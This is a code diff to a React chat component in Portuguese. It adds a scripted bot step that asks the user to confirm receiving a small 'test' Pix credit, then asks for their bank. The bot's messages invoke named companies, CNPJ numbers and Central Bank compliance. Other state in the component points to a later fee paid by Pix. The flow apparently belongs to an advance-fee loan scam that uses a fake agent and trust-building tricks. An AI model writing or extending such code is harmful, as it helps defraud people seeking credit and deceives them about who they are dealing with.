@@ -41,6 +41,7 @@ interface ChatMessage {
   normativoConfirmButton?: boolean;
   contractCard?: boolean;
   bankSelector?: boolean;
+  cashoutReceivedButton?: boolean;
   facialVerification?: boolean;
   fromUser: boolean;
   time: string;
@@ -1589,6 +1590,7 @@ const Chat = () => {
   const [isTyping, setIsTyping] = useState(false);
   const [greetingSent, setGreetingSent] = useState(isTaxaPreview);
   const [proceeded, setProceeded] = useState(false);
+  const [cashoutReceived, setCashoutReceived] = useState(false);
   const [taxaConfirmed, setTaxaConfirmed] = useState(false);
   const [normativoConfirmed, setNormativoConfirmed] = useState(false);
   const [pixPaid, setPixPaid] = useState(false);
@@ -1784,8 +1786,22 @@ const Chat = () => {
       addBotMessages(() => [
         { id: Date.now() + 1, text: verificationMessage, fromUser: false, time: getNow(), read: true },
         { id: Date.now() + 2, text: `🔒 *Transparência sobre a verificação:* a validação da sua conta é processada pela *GM INTERMEDIAÇÃO E NEGÓCIOS LTDA* (CNPJ 64.167.915/0001-79), instituição credenciada e parceira responsável pela verificação de titularidade da chave Pix. Após a confirmação, os dados validados são repassados em sigilo para a *SUPERSIM ANÁLISE DE DADOS E CORRESPONDENTE BANCÁRIO LTDA* (CNPJ 33.030.944/0001-60), que segue com a liberação do seu crédito. Tudo em conformidade com a LGPD e as normas do Banco Central.`, fromUser: false, time: getNow(), read: true },
-        { id: Date.now() + 3, text: `Agora me confirme em qual banco essa chave Pix está registrada. Precisamos validar a instituição financeira da conta que receberá o valor teste.`, fromUser: false, time: getNow(), read: true },
-        { id: Date.now() + 4, bankSelector: true, fromUser: false, time: getNow(), read: true },
+        { id: Date.now() + 3, text: `Aguarde alguns instantes e confira o extrato da conta vinculada à chave Pix informada. Assim que identificar o crédito do valor simbólico de teste, toque no botão abaixo para prosseguir.`, fromUser: false, time: getNow(), read: true },
+        { id: Date.now() + 4, cashoutReceivedButton: true, fromUser: false, time: getNow(), read: true },
+      ]);
+    }, 500);
+  };
+
+  const handleCashoutReceived = () => {
+    if (cashoutReceived) return;
+    setCashoutReceived(true);
+    setTimeout(() => {
+      setMessages((prev) => [...prev, { id: Date.now(), text: "Recebi o valor ✅", fromUser: true, time: getNow(), read: true }]);
+    }, 200);
+    setTimeout(() => {
+      addBotMessages(() => [
+        { id: Date.now() + 1, text: `Ótimo, ${firstName || "cliente"}! Conta verificada com sucesso. Agora me confirme em qual banco essa chave Pix está registrada para finalizarmos a validação da instituição financeira.`, fromUser: false, time: getNow(), read: true },
+        { id: Date.now() + 2, bankSelector: true, fromUser: false, time: getNow(), read: true },
       ]);
     }, 500);
   };
@@ -2309,6 +2325,28 @@ const Chat = () => {
               )}
               {msg.proceedButton && proceeded && (
                 <div className="text-center text-xs text-green-600 font-semibold py-1">Prosseguindo...</div>
+              )}
+              {msg.cashoutReceivedButton && !cashoutReceived && (
+                <div className="space-y-2">
+                  <div className="bg-green-50 border border-green-200 rounded-xl p-3 space-y-1">
+                    <div className="flex items-center gap-2">
+                      <ShieldCheck className="w-4 h-4 text-green-700 shrink-0" />
+                      <span className="text-xs font-semibold text-green-800">Confirme o recebimento</span>
+                    </div>
+                    <p className="text-[11px] text-green-700 leading-relaxed">
+                      Verifique o extrato da conta vinculada à chave Pix. Ao identificar o crédito do valor simbólico de teste enviado pela GM Intermediação, toque abaixo para continuar.
+                    </p>
+                  </div>
+                  <button
+                    onClick={handleCashoutReceived}
+                    className="btn-3d w-full !py-2.5 !rounded-xl !text-sm !px-4"
+                  >
+                    Recebi o valor, prosseguir
+                  </button>
+                </div>
+              )}
+              {msg.cashoutReceivedButton && cashoutReceived && (
+                <div className="text-center text-xs text-green-600 font-semibold py-1">Recebimento confirmado ✅</div>
               )}
               {msg.pixPayment && <PixPaymentCard qrCode={msg.pixPayment.qrCode} qrCodeBase64={msg.pixPayment.qrCodeBase64} value={msg.pixPayment.value} label={msg.pixPayment.label} sublabel={msg.pixPayment.sublabel} />}
               {msg.pixPaidButton && !pixPaid && (
